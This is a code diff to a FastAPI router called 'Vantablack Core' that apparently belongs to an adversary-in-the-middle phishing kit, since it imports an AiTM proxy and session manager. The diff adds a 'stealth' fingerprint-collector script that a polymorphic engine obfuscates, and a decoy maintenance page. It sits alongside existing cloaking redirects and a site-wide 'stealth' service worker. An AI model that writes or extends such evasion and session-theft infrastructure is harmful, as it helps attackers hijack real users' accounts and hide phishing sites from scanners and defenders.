@@ -9,8 +9,14 @@ from core.redirect.smart_redirector import smart_redirector
 from core.social.manager import social_manager
 from core.proxy.aitm import aitm_proxy
 from core.session.session_manager import session_manager
+from core.web.polymorph import PolymorphicEngine
+from pathlib import Path
 
 router = APIRouter(prefix="/v5", tags=["Vantablack Core"])
+
+# Initialize Polymorphic Engine
+ASSETS_DIR = Path("core/assets/js")
+poly_engine = PolymorphicEngine(ASSETS_DIR / "fingerprint_collector.js")
 
 # --- Core Management ---
 
@@ -69,6 +75,16 @@ async def verify_fingerprint(request: Request):
         print(f"[API Error] Fingerprint verification failed: {e}")
         return {"redirect_to": "https://google.com"}
 
+@router.get("/js/fp.js")
+async def polymorphic_js():
+    """Serves the Polymorphic Fingerprint Collector (Stealth)."""
+    try:
+        content = poly_engine.obfuscate()
+        return Response(content=content, media_type="application/javascript")
+    except Exception as e:
+        print(f"[PolyEngine Error] {e}")
+        return Response(content="// JS Error", media_type="application/javascript")
+
 @router.get("/sw.js")
 async def service_worker():
     """Serves the Stealth Service Worker (Power/Stealth)."""
@@ -78,6 +94,11 @@ async def service_worker():
         return Response(content=content, media_type="application/javascript", headers={"Service-Worker-Allowed": "/"})
     except FileNotFoundError:
         return Response(content="// SW Not Found", media_type="application/javascript")
+
+@router.get("/maintenance")
+async def maintenance_page():
+    """Serves the Decoy/Maintenance page (Stealth)."""
+    return smart_redirector._serve_maintenance_page()
 
 @router.get("/health")
 @redis_cache.cached("health_check", expire=60)
